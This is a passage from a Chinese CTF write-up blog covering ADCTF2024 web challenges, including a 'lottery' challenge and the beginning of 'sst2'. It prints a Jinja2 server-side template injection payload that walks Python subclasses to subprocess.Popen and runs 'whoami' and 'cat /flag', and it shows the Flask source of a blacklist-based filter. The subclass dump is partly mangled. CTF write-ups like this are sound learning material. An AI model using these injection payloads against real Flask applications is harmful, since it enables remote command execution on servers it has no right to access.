class="string">&#x27;array.array&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;array.arrayiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;threading._RLock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;threading.Condhreading.Semaphore&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;threading.Event&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;threading.Barrier&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;threading.Thread&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socketserver.BaseServer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socketserver.ForkingMixIn&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socketserver._NoThreadtserver.ThreadingMixIn&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socketserver.BaseRequestHandler&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;datetime.date&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;datetime.time&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;datetime.timedelta&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;datetime.tzinfo&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ast.AST&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakr&gt;, &lt;class &#x27;</span>weakref.finalize<span class="string">&#x27;&gt;, &lt;class &#x27;</span>warnings.WarningMessage<span class="string">&#x27;&gt;, &lt;class &#x27;</span>warnings.catch_warnings<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_random.Random<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_sha512.sha384<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_sha512.sha512<span class="string">&#x27;&gt;, &lt;class &#x27;</span>urllib.parse._ResultM</span><br><span class="line"><span class="string">&#x27;urllib.parse._ResultMixinBytes&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;urllib.parse._NetlocResultMixinBase&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;calendar._localized_month&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;calendar._localized_day&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;calendar.Calendar&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;calendar.differen &#x27;</span>email._parseaddr.AddrlistClass<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_struct.Struct<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_struct.unpack_iterato<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>string.Template<span class="string">&#x27;&gt;, &lt;class &#x27;</span>string.Formatte<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>email.charset.Charset<span class="string">&#x27;&gt;, &lt;class &#x27;</span>email.header.Heail.header._ValueFormatte<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>email._policybase._PolicyBase<span class="string">&#x27;&gt;, &lt;class &#x27;</span>email.feedparser.BufferedSubFile<span class="string">&#x27;&gt;, &lt;class &#x27;</span>email.feedparser.FeedParse<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>email.parser.Parse<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>email.parser.Bys <span class="string">&#x27;email.message.Message&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;http.client.HTTPConnection&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_ssl._SSLContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_ssl._SSLSocket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_ssl.MemoryBIO&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_ssl.SSLSession&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_ssl.Certificate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> &lt;<span class="keyword">class</span> <span class="string">&#x27;mimetypes.MimeTypes&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;zlib.Compress&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;zlib.Decompress&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_bz2.BZ2Compressor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_bz2.BZ2Decompressor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_lzma.LZMACompressor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_lzma.LZMADecompressorze.Untokenizer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;traceback._Sentinel&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;traceback.FrameSummary&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;traceback.TracebackException&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.LogRecord&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.PercentStyle&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Formatteng.BufferingFormatter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Filter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Filterer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.PlaceHolder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Manager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.LoggerAdapter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug._internal._Missing&#x27;</span>&gt;,e._MarkupEscapeHelpe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>werkzeug.exceptions.Aborte<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>werkzeug.datastructures.mixins.ImmutableListMixin<span class="string">&#x27;&gt;, &lt;class &#x27;</span>werkzeug.datastructures.mixins.ImmutableHeadersMixin<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_hashlib.HAhlib.HMAC<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_blake2.blake2<span class="string">b&#x27;&gt;, &lt;class &#x27;</span>_blake2.blake2s<span class="string">&#x27;&gt;, &lt;class &#x27;</span>tempfile._RandomNameSequence<span class="string">&#x27;&gt;, &lt;class &#x27;</span>tempfile._TemporaryFileClose<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>tempfile._TemporaryFileWrappe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>tempfile.Se<span class="string">&#x27;&gt;, &lt;class &#x27;</span>tempfile.TemporaryDirectory<span class="string">&#x27;&gt;, &lt;class &#x27;</span>urllib.request.Request<span class="string">&#x27;&gt;, &lt;class &#x27;</span>urllib.request.OpenerDirecto<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>urllib.request.BaseHandle<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>urllib.request.HTTPPasswordMg<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>uractBasicAuthHandle<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>urllib.request.AbstractDigestAuthHandle<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>urllib.request.URLopene<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>urllib.request.ftpwrappe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>werkzeug.datastructures.auth.Authorization<span class="string">&#x27;&gt;, &lt;clasructures.auth.WWWAuthenticate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ast.NodeVisitor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dis.Bytecode&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;inspect.BlockFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;inspect._void&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;inspect._empty&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;inspect.Parameter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;inspe&gt;, &lt;class &#x27;</span>inspect.Signature<span class="string">&#x27;&gt;, &lt;class &#x27;</span>werkzeug.datastructures.headers.Headers<span class="string">&#x27;&gt;, &lt;class &#x27;</span>werkzeug.datastructures.file_storage.FileStorage<span class="string">&#x27;&gt;, &lt;class &#x27;</span>werkzeug.datastructures.<span class="built_in">range</span>.IfRange<span class="string">&#x27;&gt;, &lt;class &#x27;</span>werkzeugnge.Range<span class="string">&#x27;&gt;, &lt;class &#x27;</span>werkzeug.datastructures.<span class="built_in">range</span>.ContentRange<span class="string">&#x27;&gt;, &lt;class &#x27;</span>dataclasses._HAS_DEFAULT_FACTORY_CLASS<span class="string">&#x27;&gt;, &lt;class &#x27;</span>dataclasses._MISSING_TYPE<span class="string">&#x27;&gt;, &lt;class &#x27;</span>dataclasses._KW_ONLY_TYPE<span class="string">&#x27;&gt;, &lt;class &#x27;</span>dataclass</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dataclasses.InitVar&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dataclasses.Field&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dataclasses._DataclassParams&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.sansio.multipart.Event&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.sansio.multipart.MultipartDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werpart.MultipartEncoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;importlib._abc.Loader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;pkgutil.ImpImporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;pkgutil.ImpLoader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;unicodedata.UCD&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hmac.HMAC&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wsgi.ClosingIterator&#x27;</span>&gt;, &lt;gi.FileWrappe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>werkzeug.wsgi._RangeWrappe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>werkzeug.formparser.FormDataParse<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>werkzeug.formparser.MultiPartParse<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>werkzeug.user_agent.UserAgent<span class="string">&#x27;&gt;, &lt;class &#x27;</span>werkzeug.uest<span class="string">&#x27;&gt;, &lt;class &#x27;</span>werkzeug.sansio.response.Response<span class="string">&#x27;&gt;, &lt;class &#x27;</span>werkzeug.wrappers.response.ResponseStream<span class="string">&#x27;&gt;, &lt;class &#x27;</span>werkzeug.test.EnvironBuilde<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>werkzeug.test.Client<span class="string">&#x27;&gt;, &lt;class &#x27;</span>werkzeug.test.Cookie<span class="string">&#x27;&gt;.local.Local&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.LocalManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local._ProxyLookup&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal.Decimal&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal.SignalDictMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal.ContextMaumbers.Number&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;subprocess.CompletedProcess&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;subprocess.Popen&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;platform._Processor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;uuid.UUID&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.json.provider.JSONProvider&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;gettext.NullTranslatick._compat._FixupStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click._compat._AtomicFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.LazyFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.KeepOpenFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.PacifyFlushWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.types.ParamType&#x27;</span>&gt;, er.Option<span class="string">&#x27;&gt;, &lt;class &#x27;</span>click.parser.Argument<span class="string">&#x27;&gt;, &lt;class &#x27;</span>click.parser.ParsingState<span class="string">&#x27;&gt;, &lt;class &#x27;</span>click.parser.OptionParse<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>click.formatting.HelpFormatte<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>click.core.Context<span class="string">&#x27;&gt;, &lt;class &#x27;</span>click.co</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;click.core.Parameter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.converters.BaseConverter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;difflib.SequenceMatcher&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;difflib.Differ&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;difflib.HtmlDiff&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;pprint._safe_key&#x27;</span>&gt;, &lt;classnte<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>werkzeug.routing.rules.RulePart<span class="string">&#x27;&gt;, &lt;class &#x27;</span>werkzeug.routing.rules.RuleFactory<span class="string">&#x27;&gt;, &lt;class &#x27;</span>werkzeug.routing.rules.RuleTemplate<span class="string">&#x27;&gt;, &lt;class &#x27;</span>werkzeug.routing.matcher.State<span class="string">&#x27;&gt;, &lt;class &#x27;</span>werkzeug.routichineMatche<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>werkzeug.routing.<span class="built_in">map</span>.Map<span class="string">&#x27;&gt;, &lt;class &#x27;</span>werkzeug.routing.<span class="built_in">map</span>.MapAdapte<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_csv.Dialect<span class="string">&#x27;&gt;, &lt;class &#x27;</span>_csv.reade<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>_csv.write<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>csv.Dialect<span class="string">&#x27;&gt;, &lt;class &#x27;</span>csv.DictReadDictWrite<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>csv.Sniffe<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>pathlib._Flavou<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>pathlib._Accesso<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>pathlib._Selecto<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>pathlib._TerminatingSelecto<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>pathlib.PurePath<span class="string">&#x27;&gt;, &lt;class &#x27;</span>zipfile.Zzipfile.LZMACompresso<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>zipfile.LZMADecompresso<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>zipfile._SharedFile<span class="string">&#x27;&gt;, &lt;class &#x27;</span>zipfile._Tellable<span class="string">&#x27;&gt;, &lt;class &#x27;</span>zipfile.ZipFile<span class="string">&#x27;&gt;, &lt;class &#x27;</span>zipfile.Path<span class="string">&#x27;&gt;, &lt;class &#x27;</span>textwrap.TextWrappe<span class="string">r&#x27;&gt;, &lt;cl.Finder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;importlib.abc.MetaPathFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;importlib.abc.PathEntryFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;importlib.abc.ResourceReader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;importlib.metadata.Sectioned&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;importlib.metadata.Deprecatetlib.metadata.FileHash&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;importlib.metadata.Distribution&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;importlib.metadata.DistributionFinder.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;importlib.metadata.FastPath&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;importlib.metadata.Lookup&#x27;</span>&gt;, &lt;classta.Prepared<span class="string">&#x27;&gt;, &lt;class &#x27;</span>blinker._utilities.Symbol<span class="string">&#x27;&gt;, &lt;class &#x27;</span>blinker.base.Signal<span class="string">&#x27;&gt;, &lt;class &#x27;</span>flask.cli.ScriptInfo<span class="string">&#x27;&gt;, &lt;class &#x27;</span>flask.ctx._AppCtxGlobals<span class="string">&#x27;&gt;, &lt;class &#x27;</span>flask.ctx.AppContext<span class="string">&#x27;&gt;, &lt;class &#x27;</span>flask.ctx.Request</span><br><span class="line"><span class="string">&#x27;_pickle.Pdata&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_pickle.PicklerMemoProxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_pickle.UnpicklerMemoProxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_pickle.Pickler&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_pickle.Unpickler&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;pickle._Framer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;pickle._Unframer&#x27;</span>&gt;, &lt;<span class="keyword">class</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;pickle._Unpickler&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.bccache.Bucket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.bccache.BytecodeCache&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.MissingType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.LRUCache&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Cycler&#x27;</span>&gt;, &lt;clJoine<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>jinja2.utils.Namespace<span class="string">&#x27;&gt;, &lt;class &#x27;</span>jinja2.nodes.EvalContext<span class="string">&#x27;&gt;, &lt;class &#x27;</span>jinja2.nodes.Node<span class="string">&#x27;&gt;, &lt;class &#x27;</span>jinja2.visitor.NodeVisito<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>jinja2.idtracking.Symbols<span class="string">&#x27;&gt;, &lt;class &#x27;</span>jinja2.compiler. <span class="string">&#x27;jinja2.compiler.Frame&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.TemplateReference&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.BlockReference&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.LoopContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Mnja2.runtime.Undefined&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.Failure&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.TokenStreamIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.TokenStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.Lexer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.parser.Parser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;.Environment&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.Template&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateModule&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateExpression&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2r&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.sansio.scaffold.Scaffold&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.signer.SigningAlgorithm&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.signer.Signer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous._json._CompactJSON&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.json.tag.JSONTag&#x27;</span>&gt;on.tag.TaggedJSONSerialize<span class="string">r&#x27;&gt;, &lt;class &#x27;</span>flask.sessions.SessionInterface<span class="string">&#x27;&gt;, &lt;class &#x27;</span>flask.sansio.blueprints.BlueprintSetupState<span class="string">&#x27;&gt;]</span></span><br></pre></td></tr></table></figure>

<p>然后我用了点小技巧，把头尾的<code>[]</code>掐掉，然后把所有的<code>, </code>替换为<code>\n</code>，就可以按照行号大概寻找到范围，然后搜索一下<code>subprocess</code>，找到行号为<code>338</code>，但是肯定不是338，因为这些数据并没有处理完全（例如图中348行就明显不对）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_CAtWPQfEF8.png"></p>
<p>然后继续使用<code>__getitem__()</code>尝试，最终确定索引为365</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Payload&gt; &#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">1</span>).__subclasses__().__getitem__(<span class="number">365</span>)&#125;&#125;</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;subprocess.Popen&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>然后就好办了，直接上手</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Payload&gt; &#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(365)(&quot;whoami&quot;, shell=True,stdout=-1).communicate()[0].strip()&#125;&#125; </span><br><span class="line">No hacker</span><br></pre></td></tr></table></figure>

<p>emmmm，翻车了，发现<code>[]</code>没去掉，不过没所谓，可以不要那个<code>[0].strip()</code>的，直接删掉，然后试试<code>whoami</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Payload&gt; &#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(365)(&quot;whoami&quot;, shell=True,stdout=-1).communicate()&#125;&#125;            </span><br><span class="line">(b&#x27;root\n&#x27;, None)</span><br></pre></td></tr></table></figure>

<p>此时，我们已经得到shell权限了，直接cat一下flag就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Payload&gt; &#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(365)(&quot;cat /flag&quot;, shell=True,stdout=-1).communicate()&#125;&#125; </span><br><span class="line">(b&#x27;flag&#123;47bbff15-76de-4fa3-8a98-8e9dc5f7c08f&#125;\n&#x27;, None)</span><br></pre></td></tr></table></figure>

<h2 id="Easy-lottery"><a href="#Easy-lottery" class="headerlink" title="[Easy] lottery"></a><strong>[Easy]</strong> lottery</h2><blockquote>
<p>来抽个奖，签下到！</p>
<p>能不能抽到 flag，就看你是欧还是非 &gt;w&lt;！</p>
</blockquote>
<div class="note info flat"><p>非酋是永远出不来的，还是得上手段</p>
</div>

<p>一道签到题，打开网站就能看到有两个卡池，然后在控制台能翻json，里面有列表，在空池子发现<code>Name</code>为<code>Flag</code>的内容</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_LQYQHb92KQ.png"></p>
<p>内容拿出来直接b64解码就行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_DJlCd17nKr.png"></p>
<h2 id="Normal-sst2"><a href="#Normal-sst2" class="headerlink" title="[Normal] sst2"></a><strong>[Normal]</strong> sst2</h2><blockquote>
<p>哇，黑名单变多了呀！这下题目更有挑战性啦～</p>
<p>不过，挑战越大，成就感也越强哦！</p>
</blockquote>
<p>访问得到源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 黑名单字符列表</span></span><br><span class="line">black_list = [<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;lipsum&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;[&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="comment"># 遍历黑名单字符，如果在输入的字符串中发现，返回 True</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> name.lower():</span><br><span class="line">            <span class="built_in">print</span>(x)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&#x27;/exp&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user</span>():</span><br><span class="line">    exp = request.form.get(<span class="string">&quot;exp&quot;</span>)</span><br><span class="line">    digest = request.form.get(<span class="string">&quot;digest&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span 